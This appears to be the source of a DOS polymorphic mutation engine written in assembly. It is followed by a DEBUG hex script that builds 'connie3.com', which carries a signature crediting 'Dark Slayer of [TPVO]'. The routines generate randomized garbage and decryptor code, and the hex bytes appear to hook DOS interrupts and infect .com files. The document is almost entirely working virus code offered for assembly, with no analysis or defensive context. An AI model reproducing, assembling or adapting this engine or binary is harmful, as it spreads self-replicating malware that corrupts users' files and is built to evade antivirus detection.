                mov     al,ds:addr_reg
                mov     cx,1
                test    bp,100b
                jz      miar_l1
                inc     cx
miar_l1:
                test    bp,1000b
                jz      miar_l2
                neg     cx
miar_l2:
                jmp     inc_dec_reg
make_inc_addr_reg endp

inc_dec_reg     proc    ; al = register number, cx = inc number
                push    cx
idr_l0:         push    ax cx
                call    make_
                pop     cx ax
                push    ax
                cmp     cx,3
                jbe     idr_l1
                cmp     cx,-3
                jae     idr_l1
idr_l0_1:       call    add_reg
                jmp     idr_l2
idr_l1:         call    _2_chance
                jnz     idr_l0_1
                call    inc_reg
idr_l2:         pop     ax
                or      cx,cx
                jnz     idr_l0
                pop     cx
                ret
inc_dec_reg     endp

add_reg:        or      bp,800h
                call    _2_chance
                jnz     sub_
add_:           or      al,0c0h
                jmp     add_l1
sub_:           or      al,0e8h
                neg     cx
add_l1:         test    al,111b
                jnz     add_l2
                and     al,not 0c0h
                or      al,5
                stosb
add_l1_1:       xchg    cx,ax
                stosw
                xor     cx,cx
                ret
add_l2:         mov     ah,al
                mov     al,83h
                xchg    cx,ax
                call    sign
                jz      add_l3
                mov     cl,81h
                xchg    cx,ax
                stosw
                jmp     add_l1_1
add_l3:
                xchg    cx,ax
                stosw
                xchg    cx,ax
                stosb
                xor     cx,cx
                ret

inc_reg         proc
                or      al,40h
                or      cx,cx
                jns     ir_l1
                or      al,8
                inc     cx
                inc     cx
ir_l1:
                dec     cx
                test    bp,1000h
                jnz     not_di
                cmp     al,46h
                jne     not_si
                call    _2_chance
                jnz     not_si
                test    dh,1
                jz      not_si
                test    dl,1
                jnz     not_si
                mov     al,0ach
not_si:
                cmp     al,47h
                jne     not_di
                call    _2_chance
                jnz     not_di
                mov     al,0aeh
                and     bp,not 800h
not_di:
                stosb
                ret
inc_reg         endp

make_           proc
                mov     ax,0
                org     $-2
max_number      dw      ?
m_lf1:
                test    bp,10b
                jnz     m_l1
                call    rnd_limit
                jz      m_l1
                xchg    cx,ax
m_l0:
                push    cx
                call    make_code
                pop     cx
                loop    m_l0
m_l1:           ret
make_           endp

make_3          proc
                mov     ax,3
                jmp     m_lf1
make_3          endp

make_code       proc
                or      dh,dh
                jz      mc_l8
mc_l0:
                test    bp,10b
                jnz     mc_l1
                call    _2_chance
                jnz     mc_l2
mc_l1:
                mov     al,dl
                not     al
                and     al,dh
                jz      mc_l2
                jmp     set_code
mc_l2:
                mov     al,dl
                and     al,dh
                jz      mc_l1
                mov     al,7
                call    rnd_limitb
                jnz     mc_l3
                jmp     rr_code
mc_l3:
                dec     ax
                jnz     mc_l4
                jmp     rn_code
mc_l4:
                dec     ax
                jnz     mc_l5
                jmp     xxx_r_code
mc_l5:
                dec     ax
                jnz     mc_l6
                jmp     xxx_r_1
mc_l6:
                dec     ax
                jnz     mc_l7
                jmp     xmul_r
mc_l7:
                dec     ax
                jnz     mc_l8
                jmp     xxx_r_cl
mc_l8:
                jmp     one_byte
make_code       endp

set_code        proc
                call    rnd
                xchg    bx,ax
                call    chose_chg_nset
                push    ax
                or      dl,dl
                jz      sc_l0
                call    _10_chance
                jz      sc_l1
sc_l0:
                call    _5_chance
                jnz     sc_l0_1
                call    prefix?
                mov     bx,ds:work_addr
                neg     bx
                lea     ax,[di+bx+1+1]
                call    rnd_limit
                neg     bx
                add     bx,ax
                pop     ax
                push    ax
                mov     cl,3
                shl     al,cl
                or      al,6
                mov     ah,al
                mov     al,8bh
                stosw
                cmp     ah,6
                jne     sc_l0_0
                dec     di
                dec     di
                mov     al,0a1h
                stosb
sc_l0_0:
                xchg    bx,ax
                stosw
                jmp     sc_l2
sc_l0_1:
                call    set_reg_to_bx
sc_l2:
                pop     ax
                jmp     set_set_flag
sc_l1:
                call    chose_set
                or      al,50h
                stosb
                call    make_3
                pop     ax
                call    set_set_flag
                or      al,58h
                stosb
                ret
set_code        endp

jmp_ax          proc
                call    _5_chance
                jnz     ja_l0
                push    ax
                sub     ax,di
                cmp     ax,7
                pop     ax
                jb      ja_l0
                xchg    cx,ax
                call    prefix?
                mov     ax,26ffh
                stosw
                lea     ax,[di+2]
                stosw
                xchg    cx,ax
                stosw
                xchg    cx,ax
                jmp     ja_l1
ja_l0:
                mov     cx,ax
                sub     ax,di
                dec     ax
                dec     ax
                call    sign
                jz      short_jmp
                dec     ax
                mov     byte ptr es:[di],0e9h
                inc     di
                jmp     ja_l0_1
short_jmp:      mov     ah,al
                mov     al,0ebh
ja_l0_1:        stosw
ja_l1:
                sub     cx,di
ja_l1_1:
                jcxz    ja_l2
                call    rnd
                stosb
                loop    ja_l1_1
ja_l2:
                ret
jmp_ax          endp

one_byte        proc
                call    _5_chance
                jnz     ob_ret
                call    one_byte_
                stosb
ob_ret:         ret
one_byte        endp

get_one_garbage proc
                push    bx
                call    ob_l0
                pop     bx
                ret
get_one_garbage endp

one_byte_       proc
                call    _2_chance
                jnz     ob_l1
ob_l0:
                mov     bx,offset one_byte_code
                mov     al,one_byte_number
                test    bp,8000h
                jz      ob_l0_1
                mov     al,one_byte_dcf_number
ob_l0_1:
                call    rnd_limitb
                xlat
                ret
ob_l1:
                test    dh,1
                jz      ob_l0
                test    dl,1
                jnz     ob_l0
                and     bp,not 800h
                mov     bx,offset one_byte_al_code
                mov     al,one_byte_al_number
                test    bp,8000h
                jz      ob_l0_1
                mov     al,one_byte_al_dcf_number
                jmp     ob_l0_1
one_byte_       endp

xxx_r_1         proc
                test    bp,8000h
                jnz     xr1_l2
                call    rnd
                and     al,00111000b
                test    bp,800h
                pushf
                or      bp,800h
                popf
                jnz     xr1_l1
                and     al,00101000b
xr1_l1:
                cmp     al,00110000b
                jnz     xr1_l1_1
                xor     al,al
xr1_l1_1:
                or      al,0c0h
                mov     ah,al
                call    chose_chg_set
                or      ah,al
                mov     al,0d1h
                stosw
xr1_l2:
                ret
xxx_r_1         endp

xxx_r_cl        proc
                test    bp,8000h
                jnz     xrcl_l2
                test    dl,10b
                jz      xrcl_l2
                call    rnd
                and     al,00111000b
                test    bp,800h
                pushf
                or      bp,800h
                popf
                jnz     xrcl_l1
                and     al,00101000b
xrcl_l1:
                cmp     al,00110000b
                jnz     xrcl_l1_1
                xor     al,al
xrcl_l1_1:
                or      al,0c0h
                mov     ah,al
                call    chose_chg_set
                or      ah,al
                mov     al,0d3h
                stosw
xrcl_l2:
                ret
xxx_r_cl        endp

xmul_r          proc
                test    bp,8000h
                jnz     xr_exit
                push    dx
                and     dx,0000010100000101b
                cmp     dx,0000010100000101b
                pop     dx
                jne     xr_exit
                or      bp,800h
                call    rnd
                and     al,00001000b
                or      al,11100000b
                mov     ah,al
                call    chose_set
                or      ah,al
                mov     al,0f7h
                stosw
xr_exit:
                ret
xmul_r          endp

rr_code         proc
                test    bp,8000h
                jnz     rro_3
                call    rnd
                and     al,3bh
                or      al,1+2
                test    bp,800h
                pushf
                or      bp,800h
                popf
                jnz     rro_1
                and     al,not 10h
rro_1:
                stosb
                call    chose_chg_set
                mov     ah,al
                call    chose_set
                test    byte ptr es:[di-1],10b
                jnz     rro_2
                xchg    al,ah
rro_2:
                mov     cl,3
                rol     ah,cl
                or      al,ah
                or      al,0c0h
                stosb
rro_3:
                ret
rr_code         endp

rn_code         proc
                test    bp,8000h
                jnz     rno_2
                call    chose_chg_set
                xchg    bx,ax
                call    rnd
                xchg    cx,ax
                call    rnd
                and     ax,3802h
                or      al,81h
                test    bp,800h
                pushf
                or      bp,800h
                popf
                jnz     rno_1
                and     ah,not 00010000b
rno_1:
rn_code_:
                stosb
                xchg    bx,ax
                or      al,bh
                or      al,0c0h
                test    al,111b
                jnz     rno_1_1
                and     al,not 0c0h
                or      al,5
                dec     di
                stosb
                xchg    cx,ax
                jmp     rno_1_2
rno_1_1:
                stosb
                xchg    cx,ax
                stosb
                test    byte ptr es:[di-3],10b
                jnz     rno_2
                dec     di
rno_1_2:        stosw
rno_2:
                ret
rn_code         endp

xxx_r_code      proc
                call    rnd
                and     ah,00001000b
                call    chose_chg_set
                or      al,ah
                test    bp,8000h
                jnz     xrc_l1
                call    _2_chance
                jnz     neg_not
                or      al,40h
                stosb
                ret
xrc_l1:
                and     al,11110111b
neg_not:
                or      al,0d0h
                mov     ah,al
                mov     al,0f7h
                stosw
                ret
xxx_r_code      endp

chose_set       proc    ; chose set already reg num to AL
                mov     al,dl
                jmp     cob_and_b_num
chose_set       endp

chose_chg       proc    ; chose can change reg number to AL
                mov     al,dh
                jmp     cob_and_b_num
chose_chg       endp

chose_chg_nset  proc    ; chose can change and set not yet reg number to AL
                mov     al,dl
                not     al
                and     al,dh
                jmp     cob_and_b_num
chose_chg_nset  endp

chose_chg_set   proc    ; chose can change and set already reg number to AL
                mov     al,dl
                and     al,dh
cob_and_b_num   proc    ; chose one bit and become reg number in AL
                push    dx
                push    ax
                call    chose_one_bit
                mov     al,-1
cabn_1:
                inc     al
                ror     ah,1
                jnc     cabn_1
                xchg    dx,ax
                pop     ax
                mov     al,dl
                pop     dx
                ret
cob_and_b_num   endp
chose_chg_set   endp

chose_one_bit   proc    ; chose one bit form AL to AH
                push    cx
                push    ax
                call    rnd
                and     ax,0707h
                xchg    cx,ax
                pop     ax
                mov     ah,1
                rol     ah,cl
                mov     cl,ch
                xor     ch,ch
                inc     cx
cob_1:
                rol     ah,1
                test    ah,al
                jz      cob_1
                loop    cob_1
                pop     cx
                ret
chose_one_bit   endp

set_set_flag    proc    ; set "set flag", AL=reg number
                push    ax
                call    num_to_bit
                or      dl,al
                pop     ax
                ret
set_set_flag    endp

unset_chg_flag  proc    ; set "change flag" to 0, AL=reg number
                push    ax
                call    num_to_bit
                not     al
                and     dh,al
                pop     ax
                ret
unset_chg_flag  endp

num_to_bit      proc    ; AL=reg number become to bit
                push    cx
                mov     cl,al
                mov     al,1
                rol     al,cl
                pop     cx
                ret
num_to_bit      endp

rnd_order:      ; ax, bx, si = sub proc
                push    ax
                mov     al,3fh
                call    rnd_limitb
                inc     ax
                xchg    cx,ax
                pop     ax
rol0:           call    _2_chance
                jnz     rol1
                xchg    bx,ax
rol1:           call    _2_chance
                jnz     rol2
                xchg    bx,si
rol2:           call    _2_chance
                jnz     rol3
                xchg    si,ax
rol3:           loop    rol0
                push    ax bx si
order_ret:      ret


_2_chance:
                push    ax
                mov     al,2
_2c_l1:
                call    rnd_limitb
                pop     ax
                ret

_5_chance:
                push    ax
                mov     al,5
                jmp     _2c_l1

_10_chance:
                push    ax
                mov     al,10
                jmp     _2c_l1

rnd_limitb:
                xor     ah,ah
rnd_limit       proc
                push    bx
                push    dx
                xchg    bx,ax
                call    rnd
                dec     bx
                and     ax,bx
                inc     bx
                xchg    dx,ax
                call    rnd
                div     bx
                xchg    dx,ax
                pop     dx
                pop     bx
                or      ax,ax
                ret
rnd_limit       endp

include         rnd


;================================== RND =====================================

rnd:            push    bx cx dx ds             ; ¶Ã¼Æ²£¥Í¾¹
                push    cs
                pop     ds
                in      ax,40h
                call    rnd_init
                add     ax,0
                org     $-2
rnd1            dw      0e97h
                sbb     dx,5210h
                org     $-2
rnd2            dw      5210h
                mov     cx,7
rnd_l0:         shl     ax,1
                rcl     dx,1
                mov     bl,al
                xor     bl,dh
                jns     rnd_l1
                inc     al
rnd_l1:         loop    rnd_l0
                mov     ds:rnd1,ax
                sbb     ds:rnd2,dx
                dec     word ptr ds:rnd_count
                mov     ah,dl
                xor     ax,0
                org     $-2
rnd_count       dw      ?
rnd_exit:       pop     ds dx cx bx
                ret

rnd_init:       mov     byte ptr ds:rnd_init,0c3h
                xor     ah,ah
                int     1ah
                in      ax,40h
                xor     ax,cx
                sbb     dx,ax
                adc     ds:rnd1,ax
                xor     ds:rnd2,dx
                call    rnd
                and     ax,3fh
                inc     ax
                xchg    cx,ax
rnd_loop:       xor     ds:rnd_count,ax
                rcr     ds:rnd_count,cl
                call    rnd
                loop    rnd_loop
                ret

====================[connie3.scr]=====================
n connie3.com
e 0100 8B EC FA 33 FF CD 11 B4 52 2E 9C FC 8B 73 FA CD
e 0110 21 B4 26 8B 55 02 26 8E 59 FE 39 5D 06 56 74 4F
e 0120 80 EE 05 89 5D 06 CD 21 80 3D 4D 74 05 80 3D 5A
e 0130 75 0C F9 8C DB 8B C3 13 45 03 8E D8 EB EA 8E DB
e 0140 39 7D 01 75 2A 8B 45 03 2D 95 01 F5 73 21 13 D8
e 0150 8D 74 F9 B9 13 0B 8E C3 89 45 03 F3 2E A4 B8 EB
e 0160 0A 8E D9 87 06 84 00 AB 8C C0 87 06 86 00 AB 5E
e 0170 0E BF 00 01 07 58 81 C6 D6 00 0E D0 EC 1F 57 72
e 0180 03 A4 A5 C3 68 65 6C 6C 6F 21 20 6C 6F 6E 67 20
e 0190 74 69 6D 65 20 6E 6F 20 73 65 65 2C 20 74 68 69
e 01A0 73 20 69 73 20 43 6F 6E 6E 69 65 20 33 2E 30 20
e 01B0 62 79 20 44 61 72 6B 20 53 6C 61 79 65 72 20 6F
e 01C0 66 20 5B 54 50 56 4F 5D 2C 20 4B 65 65 6C 75 6E
e 01D0 67 2C 20 54 61 69 77 61 6E 2E E9 00 00 CD 20 00
e 01E0 00 00 00 87 00 86 84 85 10 18 18 10 00 28 28 00
e 01F0 30 30 0B 23 85 00 08 28 30 38 72 75 76 78 75 77
e 0200 78 7C 7E 90 F0 CC FA FB FC CE 9B F5 F8 F9 98 9F
e 0210 D7 D6 27 2F 37 3F 9E 53 FC 80 E4 07 50 41 80 E1
e 0220 FE 89 0E 80 01 8C C0 83 C7 0F B1 04 D3 EF 03 C7
e 0230 8B FD D3 ED 2B C5 8E C0 8D 85 30 01 A3 7A 01 89
e 0240 3E 6F 02 8C 06 71 02 89 16 FE 05 5D 56 BA 00 EF
e 0250 88 36 66 03 B8 48 03 BB 6F 03 BE EA 08 E8 69 07
e 0260 89 3E FD 02 B8 C0 04 BB 52 05 BE DC 03 E8 59 07
e 0270 E8 89 02 E8 29 01 E8 84 04 B8 00 00 E8 40 05 B9
e 0280 00 00 5E 57 F3 A4 2B 3E 6F 02 89 3E 63 02 B0 00
e 0290 0C 50 A2 73 02 E8 D3 00 0E 1F 5B 50 F7 D8 03 C3
e 02A0 F7 C5 08 00 74 04 03 06 80 01 BB 00 00 26 89 47
e 02B0 02 E8 CF 00 75 1C E8 52 05 26 80 77 01 C0 F7 C5
e 02C0 20 00 75 05 80 36 3A 02 C0 E8 C4 00 26 88 47 03
e 02D0 EB 09 43 43 F7 C5 04 00 74 01 43 F7 C5 20 00 75
e 02E0 23 E8 31 07 26 88 47 02 B1 80 F7 C5 04 00 74 14
e 02F0 41 26 88 67 01 E8 F3 06 75 0A E8 0E 05 26 88 47
e 0300 02 80 C9 02 8B 1E AB 01 26 88 0F 58 F7 C5 40 00
e 0310 75 26 8B 1E 80 01 F7 C5 08 00 74 02 F7 DB 03 C3
e 0320 BB 00 00 E8 5D 00 75 0D 50 E8 DF 04 59 91 8A E1
e 0330 26 80 4F FE 02 26 89 07 B8 00 00 8B 1E AB 01 F7
e 0340 C5 20 00 74 04 26 88 07 4B 43 50 53 BB 00 00 B0
e 0350 CB 26 86 07 50 53 E8 12 00 5B 58 88 07 5B 58 88
e 0360 27 5B B9 00 00 2E 8B 16 6F 02 C3 55 06 1F 9A 00
e 0370 00 00 00 00 58 5D C3 F7 C5 01 00 75 05 50 B0 2E
e 0380 AA 58 C3 A9 80 FF 74 07 F7 D0 A9 80 FF F7 D0 C3
e 0390 F7 C5 20 00 75 08 43 F7 C5 04 00 74 01 43 C3 E8
e 03A0 5B 03 F7 C5 00 01 75 0E E8 4D 00 8A E8 E8 52 00
e 03B0 91 8A C1 AB EB 39 57 AF E8 42 03 E8 3A 00 8A E0
e 03C0 B0 EB AB 58 57 50 E8 34 03 58 8B F0 F7 D8 03 C7
e 03D0 48 48 8A E8 E8 2B 00 91 8A C1 26 89 04 5E F7 C5
e 03E0 00 20 75 0B E8 04 06 75 06 34 01 26 88 44 FE 89
e 03F0 3E 4D 02 81 E5 FF 7F C3 8B C7 F7 D8 05 00 00 48
e 0400 48 C3 B0 E2 F7 C5 00 40 75 3D 40 F7 C5 00 20 75
e 0410 36 F7 C5 40 00 75 0F B0 04 E8 E1 05 BB FA 00 D7
e 0420 F7 C5 08 00 EB 0D B0 05 E8 D2 05 BB FE 00 D7 F7
e 0430 C5 80 00 74 02 0C 01 F7 C5 00 10 74 02 B0 75 F7
e 0440 C5 00 01 74 02 34 01 C3 E8 CE 02 8A C2 24 E8 74
e 0450 F7 F7 C5 04 00 75 0B F7 C5 20 00 74 05 F6 C2 0F
e 0460 74 E6 E8 19 05 3C 00 74 DF A2 8F 01 E9 47 05 F7
e 0470 C5 40 00 74 D2 E8 85 02 8B 1E 80 01 F7 C5 04 00
e 0480 74 02 D1 EB 8B CB 52 B8 01 00 E8 5E 05 75 0A 99
e 0490 F7 D8 F7 F3 E8 68 05 74 EE A3 EF 03 F7 E3 93 5A
e 04A0 E8 CB 04 E8 10 05 A2 66 03 F7 C5 80 00 75 04 F7
e 04B0 DB EB 21 E8 3D 05 74 1C 3C 01 75 18 8B D9 C7 06
e 04C0 EF 03 01 00 F7 C5 00 01 75 06 81 CD 00 40 EB 04
e 04D0 81 CD 00 20 50 E8 A5 00 58 E9 D2 04 F7 C5 40 00
e 04E0 74 91 F7 C5 00 40 75 18 E8 12 02 A0 66 03 B9 00
e 04F0 00 F7 C5 80 00 74 02 F7 D9 E9 6D 01 F7 C5 00 60
e 0500 75 51 81 CD 00 80 F7 C5 40 00 74 5E E8 DC 04 75
e 0510 22 81 CD 00 10 33 C0 E8 D1 04 75 09 E8 F6 04 E8
e 0520 C9 04 75 01 98 91 A0 66 03 E3 05 E8 3B 01 F7 D9
e 0530 E9 36 01 E8 C7 01 E8 B2 04 75 19 B0 03 E8 BD 04
e 0540 BB F2 00 D7 AA A0 66 03 8A E0 B1 03 D2 E0 0C C0
e 0550 0A C4 AA C3 B0 05 E8 A4 04 BB F5 00 D7 8A E0 B0
e 0560 83 8A 1E 66 03 33 C9 E9 BC 03 E8 90 01 A0 8F 01
e 0570 0C F8 8A E0 B0 81 AB 89 3E 21 02 AF C3 E8 73 04
e 0580 74 2F A8 04 75 27 E8 6A 04 75 22 B9 B0 B4 E8 5A
e 0590 04 75 04 86 DF 86 CD 50 53 51 0A C1 AA 8A C3 AA
e 05A0 E8 71 01 59 5B 58 0A C5 AA 8A C7 AA C3 0C B8 EB
e 05B0 0B 50 B0 8D AA B1 03 58 D2 E0 0C 06 AA 93 AB C3
e 05C0 E8 3A 01 B0 05 E8 35 04 3C 01 77 08 F7 C5 00 08
e 05D0 75 02 04 03 D0 E0 96 81 C6 E8 00 AD F7 C5 04 00
e 05E0 74 09 F7 C5 20 00 74 03 05 01 01 50 81 E5 FF F7
e 05F0 F7 C5 01 00 74 07 80 3E 8F 01 05 75 03 E8 7D FD
e 0600 89 3E AB 01 B0 CB AA A0 8F 01 BB E0 00 D7 8A E0
e 0610 5B F7 C5 20 00 75 07 0B C3 A3 39 02 EB 23 89 1E
e 0620 39 02 52 F7 C5 04 00 9C 75 03 80 E2 0F E8 3A 03
e 0630 9D 75 07 E8 B5 03 75 02 0C 04 5A B1 03 D2 E0 0A
e 0640 C4 AA AF F7 C5 20 00 75 08 AF F7 C5 04 00 75 01
e 0650 4F C3 A0 8F 01 B9 01 00 F7 C5 04 00 74 01 41 F7
e 0660 C5 08 00 74 02 F7 D9 EB 00 51 50 51 E8 8E 00 59
e 0670 58 50 83 F9 03 76 0A 83 F9 FD 73 05 E8 11 00 EB
e 0680 08 E8 67 03 75 F6 E8 3D 00 58 0B C9 75 DC 59 C3
e 0690 81 CD 00 08 E8 54 03 75 04 0C C0 EB 04 0C E8 F7
e 06A0 D9 A8 07 75 0A 24 3F 0C 05 AA 91 AB 33 C9 C3 8A
e 06B0 E0 B0 83 91 E8 CC FC 74 06 B1 81 91 AB EB EB 91
e 06C0 AB 91 AA 33 C9 C3 0C 40 0B C9 79 04 0C 08 41 41
e 06D0 49 F7 C5 00 10 75 24 3C 46 75 11 E8 0D 03 75 0C
e 06E0 F6 C6 01 74 07 F6 C2 01 75 02 B0 AC 3C 47 75 0B
e 06F0 E8 F8 02 75 06 B0 AE 81 E5 FF F7 AA C3 B8 00 00
e 0700 F7 C5 02 00 75 0D E8 F6 02 74 08 91 51 E8 09 00
e 0710 59 E2 F9 C3 B8 03 00 EB E7 0A F6 74 43 F7 C5 02
e 0720 00 75 05 E8 C5 02 75 0A 8A C2 F6 D0 22 C6 74 02
e 0730 EB 31 8A C2 22 C6 74 F0 B0 07 E8 C0 02 75 03 E9
e 0740 88 01 48 75 03 E9 B9 01 48 75 03 E9 F8 01 48 75
e 0750 03 E9 F1 00 48 75 03 E9 48 01 48 75 03 E9 11 01
e 0760 E9 9E 00 E8 AF 02 93 E8 08 02 50 0A D2 74 05 E8
e 0770 86 02 74 3A E8 7C 02 75 2E E8 FB FB 8B 1E 6F 02
e 0780 F7 DB 8D 41 02 E8 77 02 F7 DB 03 D8 58 50 B1 03
e 0790 D2 E0 0C 06 8A E0 B0 8B AB 80 FC 06 75 05 4F 4F
e 07A0 B0 A1 AA 93 AB EB 03 E8 D3 FD 58 E9 00 02 E8 B9
e 07B0 01 0C 50 AA E8 5D FF 58 E8 F3 01 0C 58 AA C3 E8
e 07C0 31 02 75 1A 50 2B C7 3D 07 00 58 72 11 91 E8 A6
e 07D0 FB B8 FF 26 AB 8D 45 02 AB 91 AB 91 EB 18 8B C8
e 07E0 2B C7 48 48 E8 9C FB 74 08 48 26 C6 05 E9 47 EB
e 07F0 04 8A E0 B0 EB AB 2B CF E3 06 E8 18 02 AA E2 F8
e 0800 C3 E8 EF 01 75 04 E8 08 00 AA C3 53 E8 07 00 5B
e 0810 C3 E8 D7 01 75 12 BB 03 01 B0 0B F7 C5 00 80 74
e 0820 02 B0 08 E8 D7 01 D7 C3 F6 C6 01 74 E9 F6 C2 01
e 0830 75 E4 81 E5 FF F7 BB 0E 01 B0 09 F7 C5 00 80 74
e 0840 E2 B0 04 EB DE F7 C5 00 80 75 25 E8 C7 01 24 38
e 0850 F7 C5 00 08 9C 81 CD 00 08 9D 75 02 24 28 3C 30
e 0860 75 02 32 C0 0C C0 8A E0 E8 0F 01 0A E0 B0 D1 AB
e 0870 C3 F7 C5 00 80 75 2A F6 C2 02 74 25 E8 96 01 24
e 0880 38 F7 C5 00 08 9C 81 CD 00 08 9D 75 02 24 28 3C
e 0890 30 75 02 32 C0 0C C0 8A E0 E8 DE 00 0A E0 B0 D3
e 08A0 AB C3 F7 C5 00 80 75 21 52 81 E2 05 05 81 FA 05
e 08B0 05 5A 75 15 81 CD 00 08 E8 5A 01 24 08 0C E0 8A
e 08C0 E0 E8 A6 00 0A E0 B0 F7 AB C3 F7 C5 00 80 75 30
e 08D0 E8 42 01 24 3B 0C 03 F7 C5 00 08 9C 81 CD 00 08
e 08E0 9D 75 02 24 EF AA E8 91 00 8A E0 E8 7C 00 26 F6
e 08F0 45 FF 02 75 02 86 C4 B1 03 D2 C4 0A C4 0C C0 AA
e 0900 C3 F7 C5 00 80 75 3E E8 70 00 93 E8 07 01 91 E8
e 0910 03 01 25 02 38 0C 81 F7 C5 00 08 9C 81 CD 00 08
e 0920 9D 75 03 80 E4 EF AA 93 0A C7 0C C0 A8 07 75 09
e 0930 24 3F 0C 05 4F AA 91 EB 0B AA 91 AA 26 F6 45 FD
e 0940 02 75 02 4F AB C3 E8 CC 00 80 E4 08 E8 2B 00 0A
e 0950 C4 F7 C5 00 80 75 09 E8 91 00 75 06 0C 40 AA C3
e 0960 24 F7 0C D0 8A E0 B0 F7 AB C3 8A C2 EB 10 8A C6
e 0970 EB 0C 8A C2 F6 D0 22 C6 EB 04 8A C2 22 C6 52 50
e 0980 E8 0E 00 B0 FF FE C0 D0 CC 73 FA 92 58 8A C2 5A
e 0990 C3 51 50 E8 7F 00 25 07 07 91 58 B4 01 D2 C4 8A
e 09A0 CD 32 ED 41 D0 C4 84 E0 74 FA E2 F8 59 C3 50 E8
e 09B0 0E 00 0A D0 58 C3 50 E8 06 00 F6 D0 22 F0 58 C3
e 09C0 51 8A C8 B0 01 D2 C0 59 C3 50 B0 3F E8 2E 00 40
e 09D0 91 58 E8 16 00 75 01 93 E8 10 00 75 02 87 DE E8
e 09E0 09 00 75 01 96 E2 EB 50 53 56 C3 50 B0 02 E8 0C
e 09F0 00 58 C3 50 B0 05 EB F6 50 B0 0A EB F1 32 E4 53
e 0A00 52 93 E8 10 00 4B 23 C3 43 92 E8 08 00 F7 F3 92
e 0A10 5A 5B 0B C0 C3 53 51 52 1E 0E 1F E5 40 E8 2D 00
e 0A20 05 97 0E 81 DA 10 52 B9 07 00 D1 E0 D1 D2 8A D8
e 0A30 32 DE 79 02 FE C0 E2 F2 A3 21 09 19 16 25 09 FF
e 0A40 0E 46 09 8A E2 35 00 00 1F 5A 59 5B C3 C6 06 4D
e 0A50 09 C3 32 E4 CD 1A E5 40 33 C1 1B D0 11 06 21 09
e 0A60 31 16 25 09 E8 AE FF 25 3F 00 40 91 31 06 46 09
e 0A70 D3 1E 46 09 E8 9E FF E2 F3 C3 2E 8F 06 17 0B 9C
e 0A80 50 53 51 52 55 56 57 1E 06 2E FF 26 17 0B 2E 8F
e 0A90 06 17 0B 07 1F 5F 5E 5D 5A 59 5B 58 9D 2E FF 26
e 0AA0 17 0B 9C FA 0E E8 6A 01 C3 B0 00 3D B0 02 33 D2
e 0AB0 3D B0 00 B4 42 33 C9 E8 E8 FF C3 E8 BC FF B8 20
e 0AC0 12 CD 2F 26 FF 35 B8 20 12 33 DB CD 2F 58 8A E0
e 0AD0 26 87 05 50 8B F2 AC 3C FF 92 B4 06 75 02 B4 02
e 0AE0 E8 BF FF E2 F1 26 8F 05 E8 A3 FF C3 FC 8B F2 AC
e 0AF0 0A C0 75 FB 8B 44 FB 0D 20 20 3D 2E 63 75 0B 8B
e 0B00 44 FD 0D 20 20 3D 6F 6D 74 01 C3 B8 24 35 E8 91
e 0B10 FF B8 B0 03 26 87 07 50 B0 CF 26 87 47 02 50 53
e 0B20 06 B8 00 43 E8 7B FF 72 0C 8B E9 B8 01 43 33 C9
e 0B30 E8 6F FF 73 03 E9 A9 00 55 B8 02 3D E8 63 FF 73
e 0B40 03 E9 96 00 93 0E 0E 1F 07 B4 3F B9 03 00 BA DD
e 0B50 00 E8 4E FF 72 18 A1 DD 00 48 3D 59 4D 74 76 3D
e 0B60 4C 5A 74 71 E8 45 FF 0B D2 75 6A 3D 00 20 76 65
e 0B70 3D EC F0 77 60 A9 FF 01 74 5B 2D 03 00 A3 DB 00
e 0B80 05 03 01 95 E8 22 FF B8 00 57 E8 15 FF 51 52 B9
e 0B90 03 00 BA DA 00 E8 23 FF E8 11 FF 33 F6 BF 19 0B
e 0BA0 B0 20 E8 58 FE 05 13 0B 91 B0 0A E8 4F FE 40 92
e 0BB0 E8 62 FE E8 61 F6 E8 02 FF E8 F0 FE 05 FF 01 25
e 0BC0 00 FE 48 92 E8 EA FE B9 01 00 E8 EE FE 5A 59 B8
e 0BD0 01 57 E8 CD FE B4 3E E8 C8 FE B8 01 43 59 E8 C1
e 0BE0 FE 07 5B 26 8F 47 02 26 8F 07 C3 E8 8C FE 80 FC
e 0BF0 3D 74 16 80 FC 43 74 11 80 FC 4B 74 0C 80 FC 56
e 0C00 74 07 80 FC 6C 75 05 8B D6 E8 E0 FE E8 06 FE E8
e 0C10 7C FE EA
rcx
B13
w
q
======================================================

